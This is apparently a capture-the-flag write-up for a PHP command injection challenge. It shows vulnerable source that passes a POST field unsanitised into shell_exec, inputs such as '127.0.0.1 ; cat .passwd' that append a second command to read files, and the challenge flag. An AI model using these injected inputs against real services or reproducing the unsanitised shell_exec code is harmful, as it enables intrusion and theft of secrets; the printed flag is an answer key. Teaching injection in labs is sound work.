# PHP - Command injection

> Find a vulnerability in this service and exploit it. The flag is on the index.php file.

<figure><img src="../../.gitbook/assets/1 46.png" alt=""><figcaption></figcaption></figure>

* Let's input `127.0.0.1` as the input field is suggesting.

<figure><img src="../../.gitbook/assets/2 42.png" alt=""><figcaption></figcaption></figure>

* We can see that our input is used to execute a `ping` command.
* We know the flag is on the `index.php` file. In order to `cat` the flag we need to use the `;` separator.

### User Input

```
127.0.0.1 ; cat index.php
```

<figure><img src="../../.gitbook/assets/3 32.png" alt=""><figcaption></figcaption></figure>

* Looks like our input was processed properly. Let's check the source code.

<figure><img src="../../.gitbook/assets/4 22.png" alt=""><figcaption></figcaption></figure>

* The source code reveals an interesting piece of code.

### PHP code

```php
<?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
```

* The line `shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'")` executes a shell command based on user input ($\_POST\["ip"]).
* The line `"".file_get_contents(".passwd").""` reads the content of a file named `.passwd` and appends it to the `$flag` variable.
* Let's modify our input to `cat` the `.passwd` file.

### User Input

```
127.0.0.1 ; cat .passwd
```

<figure><img src="../../.gitbook/assets/5 13.png" alt=""><figcaption></figcaption></figure>

### Flag

```
S3rv1ceP1n9Sup3rS3cure
```
